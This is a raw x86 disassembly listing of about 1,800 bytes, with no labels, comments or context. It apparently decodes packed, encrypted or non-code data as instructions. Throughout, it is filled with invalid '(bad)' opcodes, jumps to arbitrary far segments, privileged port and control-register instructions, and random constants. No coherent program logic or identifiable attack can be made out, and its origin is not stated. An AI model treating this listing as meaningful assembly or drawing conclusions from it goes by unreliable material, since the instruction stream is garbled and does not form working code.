  40a40b:	push   ds
  40a40c:	or     eax,0xbd6efc32
  40a411:	mov    bl,0x65
  40a413:	dec    BYTE PTR [ebp-0x1]
  40a416:	jmp    FWORD PTR [edi]
  40a418:	lock aam 0xc1
  40a41b:	outs   dx,BYTE PTR ds:[esi]
  40a41c:	sbb    eax,0xc54d15f7
  40a421:	nop
  40a422:	stos   DWORD PTR es:[edi],eax
  40a423:	mov    ebp,0x1d2770ec
  40a428:	adc    cl,bh
  40a42a:	sbb    ah,BYTE PTR cs:0x3f03e7d8
  40a431:	(bad)  
  40a432:	jmp    FWORD PTR [edi-0x4]
  40a435:	mov    ah,0x2e
  40a437:	cmp    eax,0x3fe783c9
  40a43c:	cmp    ch,BYTE PTR [ebp-0x1a]
  40a43f:	scas   eax,DWORD PTR es:[edi]
  40a440:	ret    
  40a441:	addr16 jl 0x40a4aa
  40a444:	test   DWORD PTR [edi+0x4143af83],edi
  40a44a:	ds jmp 0xb7cfd033
  40a450:	(bad)  
  40a451:	(bad)  
  40a452:	(bad)  
  40a453:	sti    
  40a454:	jl     0x40a460
  40a456:	(bad)  
  40a458:	pop    ds
  40a459:	mov    ebx,0xa91ef41f
  40a45e:	dec    eax
  40a45f:	adc    ecx,DWORD PTR [edi-0x4eedecd5]
  40a465:	jns    0x40a49e
  40a467:	inc    ebx
  40a468:	jg     0x40a458
  40a46a:	push   es
  40a46b:	push   ecx
  40a46c:	or     eax,0xfffc001a
  40a471:	(bad)  
  40a472:	dec    DWORD PTR [edi-0x75b53bcb]
  40a478:	in     al,dx
  40a479:	or     cl,BYTE PTR [edx-0x579419ed]
  40a47f:	mov    edx,0xfcd9d8dc
  40a484:	jl     0x40a440
  40a486:	call   0xeb045c15
  40a48b:	jecxz  0x40a439
  40a48d:	retf   0x7ce8
  40a490:	in     eax,0xff
  40a492:	aaa    
  40a493:	or     cl,BYTE PTR [ebx]
  40a495:	cmp    ah,bl
  40a497:	out    0xbc,al
  40a499:	adc    eax,0x65fbe304
  40a49e:	mov    ah,0x5a
  40a4a0:	sbb    eax,0xffff3485
  40a4a5:	(bad)  
  40a4a7:	xchg   ecx,eax
  40a4a8:	(bad)  
  40a4a9:	adc    eax,0x952c3864
  40a4ae:	add    al,0x9f
  40a4b0:	mov    esi,0xa54ad6cd
  40a4b5:	push   esp
  40a4b6:	lods   eax,DWORD PTR ds:[esi]
  40a4b7:	mov    WORD PTR ds:0xd53f3484,?
  40a4bd:	(bad)  
  40a4be:	fld    TBYTE PTR [esi-0xed8bdb]
  40a4c4:	(bad)  
  40a4c5:	push   DWORD PTR [edi-0x4776e0e4]
  40a4cb:	adc    eax,0xd9857c90
  40a4d0:	dec    eax
  40a4d1:	add    DWORD PTR [ecx+esi*2],ebx
  40a4d4:	and    al,dl
  40a4d6:	add    eax,0x45e01aa0
  40a4db:	scas   al,BYTE PTR es:[edi]
  40a4dc:	push   esi
  40a4dd:	mov    ch,0xc0
  40a4df:	daa    
  40a4e0:	inc    ebp
  40a4e1:	jo     0x40a51e
  40a4e3:	(bad)  
  40a4e4:	(bad)  
  40a4e5:	(bad)  
  40a4e6:	call   FWORD PTR [eax+0x39a1b912]
  40a4ec:	jmp    0x62c:0x4f07d6c9
  40a4f3:	dec    ecx
  40a4f4:	pop    ds
  40a4f5:	xor    bl,dh
  40a4f7:	push   ebp
  40a4f8:	fild   WORD PTR [esi+0x1c44917f]
  40a4fe:	mov    al,ds:0xb596c4ae
  40a503:	cld    
  40a504:	ret    0x5971
  40a507:	mov    cl,0xf5
  40a509:	mov    edi,0x30bab9f4
  40a50e:	push   ebx
  40a50f:	dec    edx
  40a510:	sbb    DWORD PTR ds:0x6a730801,0x5719135
  40a51a:	ud0    ebx,edi
  40a51d:	cli    
  40a51e:	mov    edi,0xa431d561
  40a523:	add    al,0xdf
  40a525:	jo     0x40a4c0
  40a527:	mov    ch,0x55
  40a529:	pop    edi
  40a52a:	xchg   edi,eax
  40a52b:	jne    0x40a57e
  40a52d:	mov    ecx,0xfb980595
  40a532:	pop    esi
  40a533:	fmul   st(0),st
  40a535:	repz xlat BYTE PTR ds:[ebx]
  40a537:	(bad)  
  40a538:	(bad)  
  40a539:	(bad)  
  40a53a:	inc    DWORD PTR [eax]
  40a53c:	cwde   
  40a53d:	imul   ecx,DWORD PTR [eax+0x715348bf],0xffffffe1
  40a544:	clc    
  40a545:	fstp   TBYTE PTR [edx+0x33532845]
  40a54b:	pop    edi
  40a54c:	or     al,0x27
  40a54e:	sbb    BYTE PTR [esp+eiz*4-0x33bab659],cl
  40a555:	daa    
  40a556:	mov    edx,0xb271403
  40a55b:	call   0x273c255f
  40a560:	int3   
  40a561:	out    0x9d,eax
  40a563:	retf   0x1bce
  40a566:	stos   DWORD PTR es:[edi],eax
  40a567:	xchg   esi,eax
  40a568:	xchg   edx,eax
  40a569:	sbb    al,0x7a
  40a56b:	fmul   st,st(2)
  40a56d:	fisttp QWORD PTR [eax-0x3593ed45]
  40a573:	retf   0x32d3
  40a576:	(bad)  
  40a578:	(bad)  
  40a579:	fild   QWORD PTR [ebx-0x1e0e039e]
  40a57f:	adc    BYTE PTR [ecx],al
  40a581:	shr    BYTE PTR [eax+0x12],cl
  40a584:	stc    
  40a585:	add    edx,DWORD PTR [esi]
  40a587:	xchg   sp,ax
  40a589:	xor    dh,BYTE PTR [ecx+0x65]
  40a58c:	(bad)  
  40a58d:	mov    edi,0xfa55dfc5
  40a592:	aam    0xb2
  40a594:	mov    ah,0xcb
  40a596:	push   0xfffffff2
  40a598:	call   0xdaf5:0x98b122b4
  40a59f:	mov    eax,0x66ab029a
  40a5a4:	call   0x3f2c:0xb7e5f97e
  40a5ab:	daa    
  40a5ac:	popf   
  40a5ad:	push   0x736402e3
  40a5b2:	adc    bh,ah
  40a5b4:	sub    BYTE PTR [eax+0x51],ah
  40a5b7:	adc    BYTE PTR [ecx],ch
  40a5b9:	push   edx
  40a5ba:	jmp    FWORD PTR ds:0x28ff5f96
  40a5c0:	es (bad) 
  40a5c2:	je     0x40a641
  40a5c4:	imul   edx,DWORD PTR [edi],0x5f
  40a5c7:	adc    al,0xa4
  40a5c9:	dec    ebp
  40a5ca:	push   esi
  40a5cb:	dec    eax
  40a5cc:	scas   al,BYTE PTR es:[edi]
  40a5cd:	pop    ss
  40a5ce:	jle    0x40a5b1
  40a5d0:	push   DWORD PTR [ebp-0x3139f496]
  40a5d6:	test   DWORD PTR [ecx+0x6001d632],ebp
  40a5dc:	js     0x40a5a1
  40a5de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5df:	xor    al,BYTE PTR [ecx]
  40a5e1:	inc    ecx
  40a5e2:	xchg   bh,ah
  40a5e4:	jecxz  0x40a5e5
  40a5e6:	das    
  40a5e7:	std    
  40a5e8:	div    dh
  40a5ea:	inc    ecx
  40a5eb:	push   esi
  40a5ec:	mov    ecx,DWORD PTR ds:0xadb9dada
  40a5f2:	call   DWORD PTR [ebx]
  40a5f4:	out    0xee,eax
  40a5f6:	mov    DWORD PTR [edx+0x308b6fcb],edi
  40a5fc:	call   0xfffe:0xb7ffaf69
  40a603:	lahf   
  40a604:	cmp    ebx,edi
  40a606:	test   BYTE PTR [esi+0x2f132f79],ch
  40a60c:	dec    ebx
  40a60d:	ret    
  40a60e:	ret    0x461
  40a611:	daa    
  40a612:	xor    esp,DWORD PTR [ebx-0x3c16feda]
  40a618:	daa    
  40a619:	adc    edi,DWORD PTR [edi-0x340eefe]
  40a61f:	repnz (bad) 
  40a622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a623:	aas    
  40a624:	pop    esi
  40a625:	es jno 0x40a5f7
  40a628:	mov    esi,DWORD PTR [edx+0x4a]
  40a62b:	test   eax,0x6e7daf8e
  40a630:	cdq    
  40a631:	sti    
  40a632:	pop    ebx
  40a633:	(bad)  
  40a634:	dec    ebx
  40a636:	das    
  40a637:	adc    BYTE PTR [edx-0x57],bh
  40a63a:	les    ebp,FWORD PTR [edi+0x1d]
  40a63d:	outs   dx,BYTE PTR ds:[esi]
  40a63e:	fstp   DWORD PTR [ecx+0xf]
  40a641:	xchg   ebx,eax
  40a642:	aaa    
  40a643:	dec    edi
  40a644:	inc    ebp
  40a645:	loopne 0x40a684
  40a647:	data16 sbb al,0x2e
  40a64a:	mov    al,ds:0xffff0657
  40a64f:	(bad)  
  40a650:	call   DWORD PTR ds:0xb83c2640
  40a656:	xor    eax,eax
  40a658:	inc    edx
  40a659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a65a:	shl    BYTE PTR [esi],0xa2
  40a65d:	aaa    
  40a65e:	ret    0x8c5a
  40a661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a662:	rcl    cl,0xc5
  40a665:	clc    
  40a666:	imul   edi,DWORD PTR [esi-0x50251974],0xffffff86
  40a66d:	mov    eax,cs
  40a66f:	scas   al,BYTE PTR es:[edi]
  40a670:	mov    ebx,cs
  40a672:	(bad)  
  40a673:	(bad)  
  40a674:	jmp    FWORD PTR [ecx]
  40a676:	cdq    
  40a677:	test   al,0xa1
  40a679:	pop    esi
  40a67a:	cmp    BYTE PTR [esi+0x4abaeffc],bl
  40a680:	sbb    al,0x6e
  40a682:	enter  0xc5f2,0x20
  40a686:	cmp    esp,esi
  40a688:	jl     0x40a688
  40a68a:	hlt    
  40a68b:	out    0x6,eax
  40a68d:	add    al,al
  40a68f:	sti    
  40a690:	das    
  40a691:	mov    edi,0x1001f2fc
  40a696:	and    eax,0x7227a6e6
  40a69b:	out    0x8c,al
  40a69d:	mov    edx,0xeee768c5
  40a6a2:	xor    BYTE PTR [edi-0xd00007a],ch
  40a6a8:	retf   
  40a6a9:	in     al,0xd8
  40a6ab:	adc    BYTE PTR [ecx+0x112ee968],bh
  40a6b1:	scas   eax,DWORD PTR es:[edi]
  40a6b2:	pop    edx
  40a6b3:	rcl    BYTE PTR [ecx+0x4d],cl
  40a6b6:	sub    eax,0xc23f5c41
  40a6bb:	xor    eax,0xb636915
  40a6c0:	(bad)  
  40a6c1:	(bad)  
  40a6c3:	push   esp
  40a6c4:	sysret 
  40a6c6:	jno    0x40a69d
  40a6c8:	inc    ebp
  40a6c9:	fcmovbe st,st(0)
  40a6cb:	add    DWORD PTR [edi],esi
  40a6cd:	jg     0x40a697
  40a6cf:	seto   ch
  40a6d2:	cmp    ebx,esp
  40a6d4:	xor    eax,0xd9d2bbc3
  40a6d9:	jg     0x40a65e
  40a6db:	(bad)  
  40a6dc:	(bad)  
  40a6dd:	jge    0x40a729
  40a6df:	xor    eax,0xe9ba326b
  40a6e4:	xchg   ebx,eax
  40a6e5:	(bad)  
  40a6e6:	xor    esp,ecx
  40a6e8:	and    ebx,DWORD PTR [ebx-0x2246e6ec]
  40a6ee:	sti    
  40a6ef:	dec    ebx
  40a6f0:	xchg   edx,eax
  40a6f1:	cli    
  40a6f2:	sub    DWORD PTR [ebx-0x42],edx
  40a6f8:	push   DWORD PTR [ebx+0x2f]
  40a6fb:	fisub  WORD PTR [ebx-0x2a66461]
  40a701:	xchg   ebp,eax
  40a702:	push   0xffffffad
  40a704:	jnp    0x40a71c
  40a706:	mov    edx,0x239ac3c9
  40a70b:	sub    ebp,edx
  40a70d:	jmp    0x6cde2556
  40a712:	or     dh,cl
  40a714:	ins    DWORD PTR es:[edi],dx
  40a715:	sub    edi,0x22
  40a718:	shl    DWORD PTR [ebx+0x10ffffe2],0xea
  40a71f:	push   ecx
  40a720:	in     al,dx
  40a721:	retf   0xa339
  40a724:	jbe    0x40a770
  40a726:	mov    ecx,0x2812a7b
  40a72b:	add    BYTE PTR [ebx],dl
  40a72d:	rol    esp,0xa2
  40a730:	xchg   edi,eax
  40a731:	(bad)  
  40a732:	call   FWORD PTR [edi+0x7a]
  40a735:	and    BYTE PTR [edi+0x5763deea],al
  40a73b:	mov    dh,0xef
  40a73d:	mov    WORD PTR [esi-0x4ba282b0],?
  40a743:	fdiv   DWORD PTR [esi-0x24]
  40a746:	mov    esi,0xe49a4f26
  40a74b:	push   eax
  40a74c:	idiv   bh
  40a74e:	(bad)  
  40a74f:	(bad)  
  40a750:	dec    DWORD PTR [ebx+eax*1+0x79]
  40a754:	int3   
  40a755:	movd   mm6,eax
  40a758:	push   esi
  40a759:	pop    esi
  40a75a:	push   edi
  40a75b:	neg    BYTE PTR [eax]
  40a75d:	je     0x40a76d
  40a75f:	xor    BYTE PTR [ebp+0x364d7435],ah
  40a765:	push   esp
  40a766:	dec    esi
  40a767:	adc    bh,BYTE PTR [edi-0x7e]
  40a76a:	cmp    al,0xd0
  40a76c:	mov    dh,0x54
  40a76e:	fimul  WORD PTR [ecx-0x44]
  40a771:	retf   
  40a772:	outs   dx,DWORD PTR ds:[esi]
  40a773:	(bad)  
  40a774:	dec    ebp
  40a776:	sahf   
  40a777:	mov    al,0xd6
  40a779:	fcom   st(7)
  40a77b:	test   BYTE PTR [edx+0x3ff09ebc],0xbd
  40a782:	xchg   esp,eax
  40a783:	inc    edi
  40a784:	(bad)  
  40a785:	aas    
  40a786:	cmp    ch,BYTE PTR [edi-0x4eefb166]
  40a78c:	(bad)  
  40a78d:	(bad)  
  40a78e:	push   edx
  40a790:	push   ds
  40a791:	mov    WORD PTR [eax+0x2e],cs
  40a794:	jmp    FWORD PTR [edx]
  40a796:	not    BYTE PTR [ebp+0x27]
  40a799:	outs   dx,BYTE PTR ds:[esi]
  40a79a:	xchg   BYTE PTR [ecx+0x26],al
  40a79d:	push   edi
  40a79e:	sbb    eax,0x2311dfed
  40a7a3:	cmp    al,0xdc
  40a7a5:	lahf   
  40a7a6:	inc    ecx
  40a7a7:	sbb    BYTE PTR [esi+eax*8],dl
  40a7aa:	dec    esp
  40a7ab:	(bad)  
  40a7ac:	(bad)  
  40a7ad:	(bad)  
  40a7ae:	jmp    FWORD PTR [ebx-0x777e82da]
  40a7b4:	rcr    BYTE PTR [eax-0x3c],cl
  40a7b7:	sbb    al,0xb8
  40a7b9:	test   al,0x88
  40a7bb:	jae    0x40a7c2
  40a7bd:	fsubr  QWORD PTR [eax-0x7d4867ae]
  40a7c3:	ret    
  40a7c4:	enter  0x4da3,0x4
  40a7c8:	xor    eax,0xc8fbd468
  40a7cd:	imul   ecx,DWORD PTR [esi],0x6f
  40a7d0:	add    eax,0x2fd3fff1
  40a7d5:	fwait
  40a7d6:	mul    BYTE PTR [edx+0x7485e331]
  40a7dc:	jo     0x40a7b2
  40a7de:	mov    bl,0x72
  40a7e0:	mov    bl,ch
  40a7e2:	adc    DWORD PTR [edi],0x695542fa
  40a7e8:	push   ebp
  40a7e9:	mov    WORD PTR [ebx],cs
  40a7eb:	sub    edx,edi
  40a7ed:	mov    BYTE PTR [ebx-0x1],bl
  40a7f0:	dec    DWORD PTR [ebx-0x3]
  40a7f3:	xchg   esi,eax
  40a7f4:	das    
  40a7f5:	xor    edx,DWORD PTR [ebp+0x38]
  40a7f8:	push   ss
  40a7f9:	mov    dl,0xc5
  40a7fb:	sbb    al,0x56
  40a7fd:	je     0x40a7bd
  40a7ff:	fidiv  DWORD PTR [esi]
  40a801:	jo     0x40a857
  40a803:	es out 0x45,eax
  40a806:	je     0x40a82a
  40a808:	or     al,0x42
  40a80a:	fstp   DWORD PTR [edi-0x6]
  40a80d:	(bad)  
  40a80e:	(bad)  
  40a80f:	fisub  DWORD PTR [esi+0x49c66460]
  40a815:	sub    ecx,ecx
  40a817:	pop    ecx
  40a818:	call   FWORD PTR [ebx-0x5c671260]
  40a81e:	sbb    BYTE PTR [edi-0x68],bl
  40a821:	jg     0x40a7bc
  40a823:	fnsave [esi]
  40a825:	retf   
  40a826:	pop    eax
  40a827:	je     0x40a7ce
  40a829:	call   FWORD PTR [edi-0x20]
  40a82c:	(bad)  
  40a82d:	fscale 
  40a82f:	mov    eax,0x5232347d
  40a834:	mov    ds:0xe4b5daa1,eax
  40a839:	scas   eax,DWORD PTR es:[edi]
  40a83a:	jge    0x40a819
  40a83c:	lahf   
  40a83d:	addr16 xor al,0xfa
  40a840:	push   ss
  40a841:	sub    eax,0xffb7ee5c
  40a846:	pop    edi
  40a847:	call   0xe4c3494b
  40a84c:	adc    eax,ebx
  40a84e:	mov    ah,0x3b
  40a850:	sti    
  40a851:	add    al,0x44
  40a853:	in     eax,dx
  40a854:	push   cs
  40a855:	les    edi,FWORD PTR [ebp+0x2e02e0c2]
  40a85b:	sub    dl,ch
  40a85d:	(bad)  
  40a85e:	fild   WORD PTR [edx-0x10]
  40a864:	fcmovnb st,st(2)
  40a866:	xchg   ebx,eax
  40a867:	or     DWORD PTR ds:0xd11a02f3,0x3c274cba
  40a871:	scas   al,BYTE PTR es:[edi]
  40a872:	add    DWORD PTR [eax-0x530e1bbe],edx
  40a878:	les    esp,FWORD PTR [edi-0xf]
  40a87b:	mov    al,ds:0xe2885334
  40a880:	int    0xff
  40a882:	jmp    FWORD PTR [edi]
  40a884:	icebp  
  40a885:	push   0x551b01b
  40a88a:	pushf  
  40a88b:	pop    esi
  40a88c:	dec    esi
  40a88d:	fs ins BYTE PTR es:[edi],dx
  40a88f:	dec    ebp
  40a890:	sbb    BYTE PTR [eax],dl
  40a892:	inc    eax
  40a893:	mov    esi,0x7e24e057
  40a898:	mov    al,ds:0xeddabd00
  40a89d:	call   DWORD PTR [edi-0x4ccb0902]
  40a8a3:	arpl   WORD PTR [edx+0x22],sp
  40a8a6:	in     al,0xc4
  40a8a8:	adc    al,0xa9
  40a8aa:	pop    eax
  40a8ab:	cmp    BYTE PTR [ebp-0x44],0x29
  40a8af:	and    BYTE PTR [edx+eiz*2],0x77
  40a8b3:	or     eax,0x189c3cb4
  40a8b8:	aad    0xff
  40a8ba:	jmp    FWORD PTR [esi+0x34]
  40a8bd:	add    al,0x12
  40a8bf:	jmp    0x40a90a
  40a8c1:	mov    edi,0x5617e1b4
  40a8c6:	loop   0x40a922
  40a8c8:	lock mov bl,0xf2
  40a8cb:	fwait
  40a8cc:	add    BYTE PTR [edi+0xb],ah
  40a8cf:	mov    WORD PTR [esp+edi*1],ss
  40a8d2:	mov    BYTE PTR [ebp-0x9],cl
  40a8d5:	sub    bl,ch
  40a8d7:	mov    BYTE PTR [edi+edi*2-0x5d],bl
  40a8db:	cli    
  40a8dc:	mov    ebx,0xeb07068b
  40a8e1:	add    eax,0xeb5353eb
  40a8e6:	aas    
  40a8e7:	clc    
  40a8e8:	jmp    0x40a90e
  40a8ea:	ret    
  40a8eb:	jmp    0x40a908
  40a8ed:	jg     0x40a898
  40a8ef:	(bad)  
  40a8f1:	mov    bl,BYTE PTR [ebp-0x9]
  40a8f4:	jmp    0x40a917
  40a8f6:	bswap  ecx
  40a8f8:	pop    ss
  40a8f9:	inc    eax
  40a8fa:	jmp    0x40a934
  40a8fc:	jne    0x40a916
  40a8fe:	pop    esi
  40a8ff:	not    ebx
  40a901:	jmp    0x40a8e7
  40a903:	pop    ebx
  40a904:	jmp    0x40a8c5
  40a906:	inc    DWORD PTR [edx+0x44]
  40a909:	push   cs
  40a90a:	jmp    0x40a8ee
  40a90c:	pop    ecx
  40a90d:	jmp    0x40a92f
  40a90f:	pop    eax
  40a910:	jmp    0x40a908
  40a912:	and    BYTE PTR [edx],ah
  40a914:	loop   0x40a8d5
  40a916:	rcl    BYTE PTR [edx-0x1],0xcb
  40a91a:	jmp    0x40a906
  40a91c:	rcl    edi,0x3d
  40a91f:	jmp    0x40a933
  40a921:	cli    
  40a922:	jmp    0x40a99b
  40a924:	jmp    0x40a8e5
  40a926:	bsf    ebx,esi
  40a929:	fnsave [esi-0x1911f5db]
  40a92f:	in     al,dx
  40a930:	pop    ds
  40a931:	push   cs
  40a932:	add    al,cl
  40a934:	inc    al
  40a936:	test   eax,0xe71dbb76
  40a93b:	xor    BYTE PTR [ebx],bh
  40a93d:	mov    ebp,0x20783a50
  40a942:	sbb    DWORD PTR [ebp+0x7402f11],0x38
  40a949:	adc    BYTE PTR [ecx+0x49],bh
  40a94c:	shl    BYTE PTR [eax],0x5b
  40a94f:	cmp    BYTE PTR [ebp-0x7],dh
  40a952:	inc    edx
  40a953:	adc    DWORD PTR cs:[edi+0x38016c46],ebp
  40a95a:	jl     0x40a8fe
  40a95c:	into   
  40a95d:	inc    ebp
  40a95e:	add    DWORD PTR [edi],ebp
  40a960:	adc    ecx,DWORD PTR [eax-0x24576924]
  40a966:	add    DWORD PTR [ebx+eax*1+0x14],eax
  40a96a:	lea    edi,[eax]
  40a96c:	or     eax,DWORD PTR [edi-0x1c]
  40a96f:	pop    esp
  40a970:	call   0x4c4c:0x37cd74b
  40a977:	mov    esp,0x9ac44f8c
  40a97c:	retf   
  40a97d:	in     eax,0xd2
  40a97f:	xchg   esp,eax
  40a980:	mov    al,0xd0
  40a982:	scas   eax,DWORD PTR es:[edi]
  40a983:	push   eax
  40a984:	mov    cl,0x80
  40a986:	push   eax
  40a987:	jne    0x40a96f
  40a989:	rcr    BYTE PTR [edx+eiz*8-0x18],cl
  40a98d:	mov    eax,0xe04374b9
  40a992:	ja     0x40a961
  40a994:	lods   eax,DWORD PTR ds:[esi]
  40a995:	fisttp DWORD PTR [edi]
  40a997:	loopne 0x40aa09
  40a999:	adc    ebp,DWORD PTR [edi+eax*1]
  40a99c:	loope  0x40a99a
  40a99e:	mov    al,0x3
  40a9a0:	pusha  
  40a9a1:	add    BYTE PTR [ecx],al
  40a9a3:	dec    ebp
  40a9a4:	xor    eax,0xa019cb97
  40a9a9:	sbb    al,dh
  40a9ab:	sbb    ch,BYTE PTR [esp+edi*1+0x77]
  40a9af:	nop
  40a9b0:	push   esp
  40a9b1:	lea    edi,[ecx]
  40a9b3:	push   edi
  40a9b4:	jg     0x40aa11
  40a9b6:	jg     0x40aa04
  40a9b8:	jae    0x40a9ce
  40a9ba:	scas   al,BYTE PTR es:[edi]
  40a9bb:	mov    BYTE PTR [ebx],ch
  40a9bd:	cmp    DWORD PTR [eax+edi*4-0x4feca61c],0xcce58038
  40a9c8:	sar    BYTE PTR [edx],1
  40a9ca:	ds pop ebp
  40a9cc:	stos   DWORD PTR es:[edi],eax
  40a9cd:	or     DWORD PTR [eax-0x559d17c6],ebx
  40a9d3:	or     DWORD PTR [edx+eax*1+0xe],ebx
  40a9d7:	adc    eax,0x205c0e7c
  40a9dc:	jl     0x40a961
  40a9de:	cdq    
  40a9df:	push   0x68
  40a9e1:	(bad)  
  40a9e3:	out    dx,eax
  40a9e4:	test   BYTE PTR [ecx],bl
  40a9e6:	pusha  
  40a9e7:	mov    ah,0x23
  40a9e9:	into   
  40a9ea:	not    DWORD PTR [eax]
  40a9ec:	sub    BYTE PTR [eax+0x65],dh
  40a9ef:	sahf   
  40a9f0:	call   0xb3d9277
  40a9f5:	pushf  
  40a9f6:	xor    BYTE PTR [ecx+eiz*4],al
  40a9f9:	cli    
  40a9fa:	mov    DWORD PTR [eax-0x41c4fdbb],ecx
  40aa00:	mov    cl,0x6d
  40aa02:	pop    edx
  40aa03:	ror    BYTE PTR [bp+di],1
  40aa06:	cdq    
  40aa07:	pop    ecx
  40aa08:	pushf  
  40aa09:	xor    edx,edx
  40aa0b:	mov    eax,0x8f159a54
  40aa10:	ret    0x8a6d
  40aa13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa14:	or     dl,BYTE PTR [edi+0x17]
  40aa17:	enter  0x2bee,0x61
  40aa1b:	inc    edi
  40aa1c:	jl     0x40aa5d
  40aa1e:	pop    ebp
  40aa1f:	enter  0xdc74,0x53
  40aa23:	retf   
  40aa24:	adc    DWORD PTR es:[ecx-0x3c4ab120],eax
  40aa2b:	test   eax,0x528c37e8
  40aa30:	stos   DWORD PTR es:[edi],eax
  40aa31:	adc    DWORD PTR [ebx+edi*4-0x38],edi
  40aa35:	repz mov ebp,0x38349494
  40aa3b:	xor    BYTE PTR [ebx],dl
  40aa3d:	mov    al,ds:0xf367beaa
  40aa42:	mov    al,ds:0x438645c
  40aa47:	inc    eax
  40aa48:	sbb    DWORD PTR [eax],eax
  40aa4a:	in     eax,0x49
  40aa4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa4d:	add    DWORD PTR [edx],edi
  40aa4f:	inc    ebp
  40aa50:	test   DWORD PTR [eax],eax
  40aa52:	pop    es
  40aa53:	or     BYTE PTR [eax+0x23],cl
  40aa56:	jp     0x40aa13
  40aa58:	cld    
  40aa59:	fs das 
  40aa5b:	dec    ebx
  40aa5c:	inc    esp
  40aa5d:	push   ebx
  40aa5e:	imul   eax,DWORD PTR [esi+0x71],0x68570373
  40aa65:	push   ecx
  40aa66:	out    0xec,eax
  40aa68:	aaa    
  40aa69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa6a:	out    dx,eax
  40aa6b:	aaa    
  40aa6c:	inc    ebx
  40aa6d:	push   esi
  40aa6e:	or     eax,DWORD PTR [eax+ebp*8]
  40aa71:	pop    es
  40aa72:	or     al,0xe0
  40aa74:	pop    ecx
  40aa75:	dec    cx
  40aa77:	imul   ecx,DWORD PTR [bp+0x65],0xf8d66d6d
  40aa7f:	fs mov ebx,0x136542fb
  40aa85:	inc    esp
  40aa86:	pop    ecx
  40aa87:	pop    edx
  40aa88:	popa   
  40aa89:	add    al,0x0
  40aa8b:	pusha  
  40aa8c:	pop    edi
  40aa8d:	adc    eax,0x408d0211
  40aa92:	sbb    edx,DWORD PTR [ebx]
  40aa94:	test   dh,0x4f
  40aa97:	xor    dl,BYTE PTR [ebx]
  40aa99:	mov    eax,eax
  40aa9b:	add    BYTE PTR [ebx],al
  40aa9d:	and    edx,DWORD PTR [ebx]
  40aa9f:	(bad)  
  40aaa0:	jmp    FWORD PTR [edi]
  40aaa2:	mov    bh,0x50
  40aaa4:	das    
  40aaa5:	adc    al,0xfc
  40aaa7:	sbb    al,bl
  40aaa9:	add    bl,cl
  40aaab:	int3   
  40aaac:	enter  0xd7c9,0xcf
  40aab0:	enter  0xcecd,0xdb
  40aab4:	fcomp  st(2)
  40aab6:	fxch   st(2)
  40aab8:	(bad)  
  40aaba:	lds    ebp,FWORD PTR [eax-0x202100d0]
  40aac0:	loopne 0x40aaa3
  40aac2:	jecxz  0x40aac4
  40aac4:	in     al,0xe5
  40aac6:	cld    
  40aac7:	sub    ebp,DWORD PTR [eax]
  40aac9:	adc    BYTE PTR [ebp+0x34f55243],dh
  40aacf:	pop    ss
  40aad0:	in     al,0xdf
  40aad2:	ja     0x40aaf4
  40aad4:	gs mov eax,cr0
  40aad8:	popa   
  40aad9:	je     0x40aafb
  40aadb:	xor    BYTE PTR [edi],bl
  40aadd:	mov    al,ds:0x307ffc05
  40aae2:	xor    DWORD PTR [edx],esi
  40aae4:	xor    esi,DWORD PTR [esi*1+0x39383736]
  40aaeb:	inc    ecx
  40aaec:	inc    edx
  40aaed:	inc    ebx
  40aaee:	test   BYTE PTR [edi+ebp*8-0x72],ch
  40aaf2:	dec    eax
  40aaf3:	icebp  
  40aaf4:	xor    cl,BYTE PTR [ebx+0x1f]
  40aaf7:	add    BYTE PTR [eax+eax*1],bl
  40aafa:	add    ebx,DWORD PTR [esi]
  40aafc:	and    eax,0x99b09b0
  40ab01:	sbb    eax,0x7b3dd417
  40ab06:	xchg   ebp,eax
  40ab07:	add    BYTE PTR [edx+0x14],bl
  40ab0a:	pop    es
  40ab0b:	popa   
  40ab0c:	xor    al,0x3
  40ab0e:	inc    eax
  40ab0f:	sbb    esi,DWORD PTR [edx-0x7f3df4d4]
  40ab15:	inc    eax
  40ab16:	rol    BYTE PTR [ebx],0xa0
  40ab19:	cmp    esi,esi
  40ab1b:	sbb    edi,0x8c4d0d03
  40ab21:	add    edx,DWORD PTR [ebp+ecx*1+0x2882325b]
  40ab28:	xchg   ebx,eax
  40ab29:	or     cl,BYTE PTR [ebx+0x3f]
  40ab2c:	dec    ebx
  40ab2d:	cmp    BYTE PTR [eax],ah
  40ab2f:	xor    dh,BYTE PTR [ebx+0x7cd3265d]
  40ab35:	or     esi,esp
  40ab37:	add    eax,0xe72a2e25
  40ab3c:	dec    esi
  40ab3d:	add    ebp,DWORD PTR [esp+esi*2+0x4d]
  40ab41:	shl    DWORD PTR [ecx*2-0x6b737b84],cl
  40ab48:	pushf  
  40ab49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab4a:	xor    al,0x4d
  40ab4c:	shl    DWORD PTR [esp+ebp*4],cl
  40ab4f:	mov    ah,0xbc
  40ab51:	(bad)  
  40ab52:	int3   
  40ab53:	shl    DWORD PTR [ecx*2-0x1b232b2d],cl
  40ab5a:	in     al,dx
  40ab5b:	hlt    
  40ab5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab5d:	imul   ebx,DWORD PTR [edx+0x44ffc4b],0x9a1c140c
  40ab67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab68:	imul   ebx,DWORD PTR [edx+0x3c342c24],0x9a694c44
  40ab72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab73:	imul   edx,DWORD PTR [esp+ebx*2+0x64],0xf7bd746c
  40ab7b:	call   0xc7:0x8c847ca6
  40ab82:	retf   
  40ab83:	push   esp
  40ab84:	or     DWORD PTR [edx+esi*8],0x7
  40ab88:	add    al,0x5
  40ab8a:	fs pop ebx
  40ab8c:	jb     0x40ac00
  40ab8e:	adc    dl,bh
  40ab90:	gs push 0x7
  40ab93:	cmp    esp,DWORD PTR [edi]
  40ab95:	iret   
  40ab96:	push   es
  40ab97:	clc    
  40ab98:	inc    edx
  40ab99:	push   ebx
  40ab9a:	push   eax
  40ab9b:	push   esp
  40ab9c:	pop    es
